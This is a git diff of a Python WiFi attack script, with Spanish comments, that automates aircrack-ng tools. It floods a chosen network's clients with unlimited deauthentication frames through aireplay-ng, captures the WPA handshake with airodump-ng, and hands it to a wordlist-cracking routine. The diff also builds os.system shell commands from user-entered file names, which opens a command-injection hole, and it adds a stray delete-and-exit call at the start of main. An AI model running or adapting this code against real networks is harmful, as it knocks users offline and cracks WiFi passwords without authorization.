@@ -22,12 +22,10 @@ except ModuleNotFoundError as e:
     print("[!] Exiting...")
     exit(1)
 
-# Juntar con port_scan
-# Añadir anilisis de WiFis
+# Solicionar <lenght:
 
 def delete_files():
-    os.system("rm -r captures/* > /dev/null")
-    os.system("rm -r espec/* > /dev/null")
+    os.system('find captures -type f ! -name "*.cap" -delete')
 
 
 def restart_net():
@@ -59,7 +57,7 @@ def exiting(err):
     except NameError:
         pass
 
-    print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting all capture files..."
+    print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting some files..."
           + Fore.RESET)
 
     restart_net()
@@ -322,15 +320,22 @@ def print_process_data(dict, args):
 
 
 def prepare_attack(dict, network_to_attack, args):
-    file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + Fore.LIGHTCYAN_EX +
+    file = None
+
+    while not file:
+        file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + Fore.LIGHTCYAN_EX +
                                                     "Enter the name of the file to save [E.j capture1] > ")
+
+        if os.system("find captures/{}/{}* 2>/dev/null 1>/dev/null".format(network_to_attack, file)) == 0:
+            print(Fore.RED + "\n\t[!] " + Fore.YELLOW + "Este nombre ya esta usado por algún archivo.")
+            file = None
+
 
     # Definimos bssid y channel
     bssid = dict[network_to_attack]['bssid']
     ch = dict[network_to_attack]['channel']
-
     # Leer handshake
-    direc = "captures/" + bssid
+    direc = "captures/" + network_to_attack
 
     if not os.path.exists(direc):
         os.makedirs(direc)
@@ -342,38 +347,24 @@ def prepare_attack(dict, network_to_attack, args):
     input(Fore.YELLOW + "\n\t\t[ENTER] To continue\n")
 
 
-    # Preparamos multiproceso para poder pararlos todos a la vez
-    #deauth = multiprocessing.Process(target=deauth_clients(bssid))
-
-
-    # Preparamos subproceso de capture hand
-    capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch, file))
+    capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch, file, network_to_attack))
 
     # Iniciamos la captura del handshake y envio de deauth
     capture.start()
-    #deauth.start()
 
     # Juntamos para detener
     capture.join()
-    #deauth.join()
 
 
-"""def deauth_clients(bssid):
-    # Enviar paquetes "deauth"
-"""
+def capture_handshake(direc, args, bssid, ch, file, network_to_attack):
+    test = subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.DEVNULL)
 
-
-def capture_handshake(direc, args, bssid, ch, file):
-
-    hand = subprocess.Popen(["airodump-ng", "-w", "./captures/{}/".format(bssid) + file, "-c", ch, "--bssid", bssid,
+    hand = subprocess.Popen(["airodump-ng", "-w", f"captures/{network_to_attack}/" + file, "-c", ch, "--bssid", bssid,
                              f"{interface}"], stdout=subprocess.PIPE)
-
-    subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.PIPE)
     done = False
     while True:
         try:
             output = hand.stdout.readline()
-
             print(output.decode().strip())
             if "WPA handshake:".encode() in output:
                 done = True
@@ -388,7 +379,7 @@ def capture_handshake(direc, args, bssid, ch, file):
     else:
         print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
         exiting(err=True)
-    crack_handshake(direc, args)
+    crack_handshake(direc, args, file)
 
 
 def find_wordlists(wordlists):
@@ -401,9 +392,9 @@ def find_wordlists(wordlists):
     return wordlists
 
 
-def crack_handshake(direc, args):
+def crack_handshake(direc, args, file):
     # Buscamos arhchivo .cap
-    os.system("find {}/*.cap > espec/capture_file ".format(direc))
+    os.system("find {}/{}*.cap > espec/capture_file ".format(direc, file))
 
     # Comprobamos si nos ha pasasdo discionario y si existe en su sistema
     wordlist = find_wordlists(args.wordlist)
@@ -432,6 +423,8 @@ def crack_handshake(direc, args):
 
 def main():
     try:
+        delete_files()
+        exit()
         # Recogemos argumentos
         parser = argparse.ArgumentParser()
         parser.add_argument("-w", "--wordlist", help="Use an extern wordlists dictionary", required=True)
